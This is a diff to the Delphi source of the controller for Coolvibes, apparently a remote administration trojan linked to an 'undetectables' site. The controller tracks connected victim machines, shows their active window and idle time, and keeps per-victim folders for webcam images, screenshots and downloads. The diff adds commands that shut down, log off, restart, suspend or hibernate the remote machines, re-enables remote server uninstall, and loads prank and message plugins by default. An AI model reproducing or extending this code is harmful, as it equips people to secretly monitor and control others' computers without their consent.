@@ -105,7 +105,6 @@ type
     Encendidohace1: TMenuItem;
     Idioma1: TMenuItem;
     Puerto1: TMenuItem;
-    Servidor1: TMenuItem;
     Cerrar1: TMenuItem;
     Actualizar1: TMenuItem;
     Desinstalar1: TMenuItem;
@@ -116,9 +115,16 @@ type
     VuelvaaaveractividadenelPC1: TMenuItem;
     Cambiedeventana1: TMenuItem;
     Avisos1: TMenuItem;
-    N4: TMenuItem;
     Abrirdirectoriousuario1: TMenuItem;
     Plugins: TMenuItem;
+    N5: TMenuItem;
+    N6: TMenuItem;
+    N4: TMenuItem;
+    Apagar1: TMenuItem;
+    Cerrarsesin1: TMenuItem;
+    Reiniciar1: TMenuItem;
+    Suspender1: TMenuItem;
+    Hibernar1: TMenuItem;
     procedure BtnEscucharClick(Sender: TObject);
     procedure ListViewConexionesContextPopup(Sender: TObject; MousePos: TPoint; var Handled: Boolean);
     procedure Abrir1Click(Sender: TObject);
@@ -139,8 +145,6 @@ type
     procedure FormShow(Sender: TObject);
     procedure MostrarOcultar1Click(Sender: TObject);
     procedure Salir1Click(Sender: TObject);
-    procedure NotificacionesClick(Sender: TObject);
-    procedure PopupMenuTrayPopup(Sender: TObject);
     procedure wwwindetectablesnet1Click(Sender: TObject);
     procedure TimerMandarPingTimer(Sender: TObject);
     procedure GloboEmergente(titulo: string; mensaje: string; tipo: Cardinal);
@@ -162,6 +166,12 @@ type
     procedure Cambiedeventana1Click(Sender: TObject);
     procedure Abrirdirectoriousuario1Click(Sender: TObject);
     procedure PluginClick(Sender: TObject);
+    procedure NotificacionesClick(Sender: TObject);
+    procedure Apagar1Click(Sender: TObject);
+    procedure Cerrarsesin1Click(Sender: TObject);
+    procedure Reiniciar1Click(Sender: TObject);
+    procedure Suspender1Click(Sender: TObject);
+    procedure Hibernar1Click(Sender: TObject);
   private
     ColumnaOrdenada, Columna: Integer;
     WndMethod: TWndMethod;
@@ -428,7 +438,7 @@ begin
               (item.SubItems.Objects[1] as TFormControl).Caption := (item.SubItems.Objects[1] as TFormControl).Caption + ' ' + _('DESCONECTADO');
             end;
         end;
-      if FormOpciones.CheckBoxNotiMsnDesc.Checked then
+      if FormOpciones.CheckBoxNotiMsnDesc.Checked and not DesactivarNotificaciones then
         begin
           // si la opcion esta checkeado mandamos al globo emergente el item
           NotiMsnDesconect(item);
@@ -448,6 +458,16 @@ begin
   StatusBar.Panels[0].Text := _('Número de conexiones: ') + IntToStr(NumeroConexiones);
 end;
 
+//DSR DEV
+function StrToHex(Str: string): string;
+var
+  I: Integer;
+begin
+  Result := EmptyStr;
+  for I := 1 to Length(Str) do
+    Result := Result + IntToHex(Byte(Str[I]), SizeOf(Byte) * 2);
+end;
+
 procedure TFormMain.ServerSocketExecute(AThread: TIdPeerThread);
 var
   Len, i, Ping: Integer;
@@ -460,12 +480,14 @@ var
 
 begin
   try
-    Buffer := Trim(Athread.Connection.ReadLn(#10#15#80#66#77#1#72#87));
+    Buffer := (Athread.Connection.ReadLn(#10#15#80#66#77#1#72#87));
   except
     Athread.Connection.Disconnect;
     Exit;
   end;
   Len := Length(Buffer);
+
+  if Buffer = '' then exit;
 
   if Buffer = 'CONNECTED?' then
     Exit //Lo ignoramos
@@ -515,7 +537,7 @@ begin
       Item.SubItems[4] := IntToStr(Ping); //Ping
 
       if Item.SubItems[5] <> Copy(Recibido, 1, Pos('|', Recibido) - 1) then
-        if Pos('V', Item.SubItems[11]) > 0 then
+        if (Pos('V', Item.SubItems[11]) > 0) and not DesactivarNotificaciones then
           GloboEmergente(_('Cambio de Ventana: ') + Item.Caption, Copy(Recibido, 1, Pos('|', Recibido) - 1), NIIF_INFO);
 
       Item.SubItems[5] := Copy(Recibido, 1, Pos('|', Recibido) - 1); //Ventana activa
@@ -527,7 +549,7 @@ begin
       Fmt.LongTimeFormat := 'hh:nn:ss';
       Fmt.TimeSeparator := ':';
       if StrToDateTime(Item.subitems[6], Fmt) > StrToDateTime(Copy(Recibido, 1, Pos('|', Recibido) - 1), Fmt) then
-        if Pos('A', Item.SubItems[11]) > 0 then
+        if (Pos('A', Item.SubItems[11]) > 0) and not DesactivarNotificaciones then
           GloboEmergente(_('Actividad detectada'), Item.Caption, NIIF_INFO);
 
       // TSU -> GetIdleTime -> ms. que el SO ha estado inactivo (se pone a 0 en cuanto el SO tiene actividad
@@ -539,6 +561,10 @@ begin
 
       Exit;
     end;
+
+
+
+   SHOWMESSAGE(StrToHex(PChar(Buffer)));
 
   {Si llega aquí es que el SocketHandle no se encontró entre los SocketHandles
    de las conexiones principales y una de dos:
@@ -592,10 +618,10 @@ begin
       //AThread.Connection.WriteLn('GETSH|'+IntToStr(AThread.Handle));
       //Mostramos la notificación
       Recibido := '';
-      if Formopciones.CheckBoxNotificacionMsn.Checked then
+      if Formopciones.CheckBoxNotificacionMsn.Checked and not DesactivarNotificaciones then
         SendMessage(FormMain.Handle, WM_POP_MESSAGE, Integer(Item), 0);
 
-      if FormOpciones.CheckBoxAlertaSonora.Checked then //Alerta sonora
+      if FormOpciones.CheckBoxAlertaSonora.Checked and not DesactivarNotificaciones then //Alerta sonora
         if fileexists(Formopciones.EditRutaArchivoWav.Text) then
           begin
             sndPlaySound(nil, 0); //Paramos el anterior si está sonando
@@ -756,7 +782,8 @@ begin
     //Valores de la Form de Opciones
     with FormOpciones do
       begin
-        Plugins := Ini.ReadString('Opciones', 'Plugins', '');
+       {Los plugins predeterminados}
+        Plugins := Ini.ReadString('Opciones', 'Plugins', ExtractFilePath(ParamStr(0))+'Recursos\Plugins\Mensajes\MensajesC.dll'+'|'+ExtractFilePath(ParamStr(0))+'Recursos\Plugins\Bromas\BromasC.dll'+'|');
         EditPuerto.Text :=
           Ini.ReadString('Opciones', 'PuertoEscucha', '3360;77');
         CheckBoxPreguntarAlSalir.Checked :=
@@ -792,7 +819,8 @@ begin
         LabeledDirWebcam.Text := Ini.ReadString('Opciones', 'PathWebcam', '%CoolDir%\Usuarios\%Identificator%\Webcam\');
         LabeledDirThumbs.Text := Ini.ReadString('Opciones', 'PathMiniaturas', '%CoolDir%\Usuarios\%Identificator%\Miniaturas\');
         LabeledDirDownloads.Text := Ini.ReadString('Opciones', 'PathDescargas', '%CoolDir%\Usuarios\%Identificator%\Descargas\');
-
+        CheckBoxGuardarPluginsEnDisco.Checked := Ini.ReadBool('Opciones', 'GuardarPluginsADisco', True);
+        CheckBoxIncluirTreeView.Checked := Ini.ReadBool('Opciones', 'IncluirTreeViewArchivos', True);
       end;
 
       Tempstr := FormOpciones.Plugins;   //añadimos los plugins al listview
@@ -907,6 +935,8 @@ begin
     Ini.WriteString('Opciones', 'AlertaSonoraPath', FormOpciones.EditRutaArchivoWav.Text);
     Ini.WriteBool('Opciones', 'CControlIndependiente',
       FormOpciones.CheckBoxCCIndependiente.Checked);
+    Ini.WriteBool('Opciones', 'IncluirTreeViewArchivos',
+      FormOpciones.CheckBoxIncluirTreeView.Checked);
 
     Ini.WriteString('Opciones', 'PathUsuario', FormOpciones.LabeledEditDirUser.Text);
     Ini.WriteString('Opciones', 'PathCapturas', FormOpciones.LabeledDirScreen.Text);
@@ -914,6 +944,9 @@ begin
     Ini.WriteString('Opciones', 'PathMiniaturas', FormOpciones.LabeledDirThumbs.Text);
     Ini.WriteString('Opciones', 'PathDescargas', FormOpciones.LabeledDirDownloads.Text);
 
+    Ini.WriteBool('Opciones', 'GuardarPluginsADisco',
+      FormOpciones.CheckBoxGuardarPluginsEnDisco.Checked);
+      
     //Valores de la Form de Configuracion del server
     Ini.WriteString('ConfigurarServidor', 'ID', FormConfigServer.EditID.Text);
     Ini.WriteString('ConfigurarServidor', 'Conectar', FormConfigServer.ipsypuertos);
@@ -970,8 +1003,6 @@ end;
 
 procedure TFormMain.FormCreate(Sender: TObject);
 var
-  ServerFile: file;
-  Tamano: Integer;
   i: Integer;
 begin
   Application.OnMinimize := MinimizeToTrayClick;
@@ -992,22 +1023,6 @@ begin
   Shell_NotifyIcon(NIM_ADD, @TrayIconData);
 
   Self.Caption := 'Coolvibes ' + VersionCool + ' Update ' + UpdateNum + ' ::   [ www.indetectables.net ]';
-
-  if fileexists(extractfiledir(ParamStr(0)) + '\Recursos\coolserver.dll') then
-    begin
-
-      FileMode := 0;
-      AssignFile(ServerFile, extractfiledir(ParamStr(0)) + '\Recursos\coolserver.dll'); //archivo de CoolServer
-      Reset(ServerFile, 1);
-      tamano := FileSize(ServerFile);
-      SetLength(Servdll, tamano);
-      BlockRead(ServerFile, Servdll[1], tamano); //cargado archivo a servdll
-      CloseFile(ServerFile);
-
-    end
-  else
-    MessageDlg(_('CoolServer.dll no existe, no se podrán mandar servidores'), mtWarning, [mbOK], 0);
-
 end;
 
 //Para el globo emergente
@@ -1061,11 +1076,13 @@ begin
 end;
 
 procedure TFormMain.FormShow(Sender: TObject);
+var
+  ServerFile: file;
+  Tamano: Integer;
 begin
 
   if PrimeraVezQueMeMuestro then
     begin
-      PrimeraVezQueMeMuestro := False;
       WndMethod := ListViewConexiones.WindowProc;
       ListViewConexiones.WindowProc := CheckMesg;
       Traducir();
@@ -1075,6 +1092,20 @@ begin
         BtnEscuchar.Click;
       TimerMandarPing.Interval := StrToIntDef(FormOpciones.EditPingTimerInterval.Text, 30) * 1000;
       TimerMandarPing.Enabled := FormOpciones.CheckBoxMandarPingAuto.Checked;
+
+      if fileexists(extractfiledir(ParamStr(0)) + '\Recursos\coolserver.dll') then
+      begin
+        FileMode := 0;
+        AssignFile(ServerFile, extractfiledir(ParamStr(0)) + '\Recursos\coolserver.dll'); //archivo de CoolServer
+        Reset(ServerFile, 1);
+        tamano := FileSize(ServerFile);
+        SetLength(Servdll, tamano);
+        BlockRead(ServerFile, Servdll[1], tamano); //cargado archivo a servdll
+        CloseFile(ServerFile);
+      end
+      else
+        MessageDlg(_('CoolServer.dll no existe, no se podrán mandar servidores'), mtWarning, [mbOK], 0);
+      PrimeraVezQueMeMuestro := False;
     end;
 
 end;
@@ -1100,6 +1131,8 @@ end;
 
 procedure TFormMain.MostrarOcultar1Click(Sender: TObject);
 begin
+  if PrimeraVezQueMeMuestro then //Aun no se ha mostrado 
+    exit;
   if FormMain.Visible then //Ocultar
     MinimizeToTrayClick(Sender) //En esa procedure se esconde la form
   else
@@ -1118,25 +1151,6 @@ procedure TFormMain.Salir1Click(Sender: TObject);
 begin
   FormMain.OnCloseQuery := nil;
   Close;
-end;
-
-procedure TFormMain.NotificacionesClick(Sender: TObject);
-var
-  Status : boolean;
-begin
-  Status := not Notificaciones.Checked;
-  with FormOpciones do
-  begin
-    CheckBoxGloboalPedirS.Checked := status;
-    CheckBoxNotificacionMsn.Checked := status;
-    CheckBoxNotiMsnDesc.Checked := status;
-    CheckBoxAlertaSonora.Checked := status;
-  end;
-end;
-
-procedure TFormMain.PopupMenuTrayPopup(Sender: TObject);
-begin
-  Notificaciones.Checked := FormOpciones.CheckBoxGloboalPedirS.Checked or FormOpciones.CheckBoxNotificacionMsn.checked or FormOpciones.CheckBoxNotiMsnDesc.checked or Formopciones.CheckBoxAlertaSonora.Checked;
 end;
 
 procedure TFormMain.MinimizeToTrayClick(Sender: TObject);
@@ -1334,8 +1348,7 @@ var
   AThread: TIdPeerThread;
   mslistviewitem: TListItem;
 begin
-  MessageDlg(_('De momento no funciona esta función :-)'), mtWarning, [mbOK], 0); //Opción no dispobible de momento ;)
-  Exit;
+
   if MessageBoxW(Handle,
     Pwidechar(_('¿Está seguro de que desea desinstalar el servidor? ¡Este será removido completamente del equipo!')),
     pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) <> idYes then
@@ -1499,6 +1512,112 @@ begin
     end;
 end;
 
+
+procedure TFormMain.NotificacionesClick(Sender: TObject);
+begin
+  DesactivarNotificaciones := not DesactivarNotificaciones;
+  Notificaciones.Checked := DesactivarNotificaciones;
+end;
+
+procedure TFormMain.Apagar1Click(Sender: TObject);
+var
+  i: Integer;
+  AThread: TIdPeerThread;
+  mslistviewitem: TListItem;
+begin
+
+  if MessageBoxW(Handle,
+    Pwidechar(_('¿Está seguro de que desea apagar el pc del servidor(es) seleccionado(s)?')),
+    pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) <> idYes then
+    Exit;
+  mslistviewitem := ListViewConexiones.Selected;
+  while Assigned(mslistviewitem) do
+    begin
+      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
+      AThread.Connection.WriteLn('APAGARPC');
+      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+    end;
+end;
+
+procedure TFormMain.Cerrarsesin1Click(Sender: TObject);
+var
+  i: Integer;
+  AThread: TIdPeerThread;
+  mslistviewitem: TListItem;
+begin
+
+  if MessageBoxW(Handle,
+    Pwidechar(_('¿Está seguro de que desea cerrar sesion en el pc del servidor(es) seleccionado(s)?')),
+    pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) <> idYes then
+    Exit;
+  mslistviewitem := ListViewConexiones.Selected;
+  while Assigned(mslistviewitem) do
+    begin
+      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
+      AThread.Connection.WriteLn('CERRARSESIONPC');
+      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+    end;
+end;
+
+procedure TFormMain.Reiniciar1Click(Sender: TObject);
+var
+  i: Integer;
+  AThread: TIdPeerThread;
+  mslistviewitem: TListItem;
+begin
+
+  if MessageBoxW(Handle,
+    Pwidechar(_('¿Está seguro de que desea reiniciar el pc del servidor(es) seleccionado(s)?')),
+    pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) <> idYes then
+    Exit;
+  mslistviewitem := ListViewConexiones.Selected;
+  while Assigned(mslistviewitem) do
+    begin
+      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
+      AThread.Connection.WriteLn('REINICIARPC');
+      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+    end;
+end;
+
+procedure TFormMain.Suspender1Click(Sender: TObject);
+var
+  i: Integer;
+  AThread: TIdPeerThread;
+  mslistviewitem: TListItem;
+begin
+
+  if MessageBoxW(Handle,
+    Pwidechar(_('¿Está seguro de que desea suspender el pc del servidor(es) seleccionado(s)?')),
+    pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) <> idYes then
+    Exit;
+  mslistviewitem := ListViewConexiones.Selected;
+  while Assigned(mslistviewitem) do
+    begin
+      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
+      AThread.Connection.WriteLn('SUSPENDERPC');
+      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+    end;
+end;
+
+procedure TFormMain.Hibernar1Click(Sender: TObject);
+var
+  i: Integer;
+  AThread: TIdPeerThread;
+  mslistviewitem: TListItem;
+begin
+
+  if MessageBoxW(Handle,
+    Pwidechar(_('¿Está seguro de que desea hibernar el pc del servidor(es) seleccionado(s)?')),
+    pwidechar(_('Confirmación')), Mb_YesNo + MB_IconAsterisk) <> idYes then
+    Exit;
+  mslistviewitem := ListViewConexiones.Selected;
+  while Assigned(mslistviewitem) do
+    begin
+      AThread := TidPeerThread(mslistviewitem.SubItems.Objects[0]);
+      AThread.Connection.WriteLn('HIBERNARPC');
+      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+    end;
+end;
 
 end.
 
